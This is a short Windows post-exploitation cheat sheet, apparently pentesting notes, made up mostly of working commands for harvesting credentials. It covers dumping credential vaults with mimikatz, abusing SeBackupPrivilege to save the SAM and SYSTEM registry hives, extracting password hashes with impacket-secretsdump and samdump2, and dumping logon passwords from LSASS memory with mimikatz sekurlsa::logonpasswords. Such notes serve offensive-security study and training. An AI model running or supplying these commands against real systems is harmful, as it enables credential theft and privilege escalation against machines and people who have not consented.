

```
Get-History 

#history path
(Get-PSReadLineOption).HistorySavePath

#used to keep track of execute commands
Start-Transcript  -Path "C:\Users\USER\Desktop\Log.txt"

```

  Dump vault with mimikatz
```
mimikatz.exe vault::list
```


  Enumerate vaults
```
vaultcmd /list
```


- If we have the seBackupPrivilege
```sh
#assign a memeber
Add-LocalGroupMember -Group "Backup Operators" -Member "Noob"
# Find SAM and  SYSTEM 
```


```
reg save hklm\sam C:\Users\Noob\DEsktiop
reg save hklm\system C:\Users\Noob\DEsktiop

```


Dumping Hashes from SYSTEM and  SAM

```sh

impacket-secretsdump -sam ./SAM -system ./SYSTEM LOCAL

# the order is important 
samdump2 SYSTEM SAM 
```


SAM location

```
C:\Windows\system32\config\sam
```



Cached AD credentials:
In modern versions of Windows, these hashes are stored in the _Local Security Authority Subsystem Service_(LSASS) memory space. LSASS process is part of the operating system and runs as SYSTEM, we need SYSTEM (or local administrator) permissions to gain access to the hashes stored on a target.

```
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```